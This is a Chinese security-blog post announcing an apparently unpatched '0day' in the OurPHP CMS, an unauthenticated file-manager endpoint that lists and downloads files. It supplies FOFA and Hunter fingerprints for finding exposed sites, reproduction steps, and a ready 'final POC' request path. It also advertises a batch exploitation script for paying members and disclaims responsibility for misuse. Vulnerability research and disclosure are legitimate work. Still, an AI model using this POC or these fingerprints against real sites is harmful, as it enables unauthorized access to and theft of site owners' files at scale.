#  0Day-OURPHP建站系统存在未授权访问漏洞   
原创 狐狸  狐狸说安全   2025-01-03 00:55  
  
**免责声明**  
  
由于传播、利用本公众号狐狸说安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号  
狐狸说安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！  
### 0x01 概述  
  
OurPHP 是一款100%开源的CMS万能建站系统。  
  
支持企业建站+多商城+商城分销+AI创作+小程序+世界语言外贸建站的CMS万能建站系统。  
### 0x02 正文  
  
**FOFA指纹：body="OURPHP"**  
  
**鹰图指纹：****web.body="OURPHP"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23rsjyHibqf0NNGEqEAqlRXV0FXtFQicHGubfGvzJR9Ksic2sFS0GibdEcJdw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23rM4HibXriblFvZO413SPWVmcAuEH2AXN6zia5evWQpOyZBicXuKQogG0IGw/640?wx_fmt=png&from=appmsg "")  
  
**复现过程：******  
  
点击备忘录的地方  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23r2FzXHT1DNd8Gx5tt9mbLFG2AsVYbxgMxk14JYx08zF72kL31osWzibA/640?wx_fmt=png&from=appmsg "")  
  
  
点击上传附件然后点击文件空间的地方抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23rkWLekrZENAskpjITibulanWiaMjqDY31G4T6pRaCkjrWJPtTawiaCRkGw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23roblH9GbkPEYIN6Wd90ibJF2H0Zq7cc4D3uVQIcpH0o9sHdiayOdaCiasQ/640?wx_fmt=png&from=appmsg "")  
  
  
会列出uploadfile文件夹下的目录以及文件  
  
删除cookie进行操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23r487KYibAbI7TwabHgoHBn0IDwfUCIKkUgiaPAbXNrt6odiaordtJkvPWA/640?wx_fmt=png&from=appmsg "")  
  
  
发现还是可以访问到，转到代码进行查看  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23rHlktWFFtiarM5cwoTmgBROA7jO3YWDgw3805DdA9FAxMa8SBLC3Dtyw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23r9S3nnaWkDf1Ru08UpN0F230zAnTJpwrNXQiangjHTicfl2kFibBzicu5ww/640?wx_fmt=png&from=appmsg "")  
  
  
可见从头到尾并未发现调用cookie和session进行校验的函数，所以可以直接未授权访问  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23rWZWzTZNsOLSfERfSVzM6dFRTiaBcTS1dQBI21GZ8MBSzTj0ry83R8BA/640?wx_fmt=png&from=appmsg "")  
  
```
http://192.168.101.219/function/editor/php/file_manager_json.php?path=20241126/&order=NAME&dir=file
```  
  
因为代码中检测了末尾必须是/结尾，所以我们拼接访问的时候要加/才可以  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23rrRAGEMpCkAV3XgYNhOIpj59l1g09WlAiaBwrnPoRficTfH7kJ5Z0GgCQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYC9GBFLB3Z2RUc0KngG23rBfzuRMxkpI7fp9cMNcibibMy5GGAicyxKuF7rAoBgoCTZOpFich1iaxcT3w/640?wx_fmt=png&from=appmsg "")  
  
  
可直接读取当前路径下所有的目录以及文件，均可任意查看以及下载操作  
  
**最终POC：**  
```
/function/editor/php/file_manager_json.php?path=/&order=NAME&dir=file
```  
  
  
  
**0x03结尾**  
  
此漏洞详情已上传圈子，批量POC脚本也已上传至圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYCBlib0RxTOaKian3LgGy7hbZgLOGRjzKZE5K6ndHtT4vh5yvcjaHibD43EUiaNl9zEMfYcNHf365deg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwYCBlib0RxTOaKian3LgGy7hbEkLgaricn2iaJJ4PmnVHM75PJStEMJTLYnjogiaI6wSibkXyrQ11ujy8DQ/640?wx_fmt=png&from=appmsg "")  
  
**0x04内部圈子**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pH5fZ5lvwwYCBlib0RxTOaKian3LgGy7hbGFLYASuM38Jmsuia9tnnnDqjpGcGMJd0jIYDXbQu9ibyxSht6DZm7HDQ/640?wx_fmt=jpeg&from=appmsg "")  
  
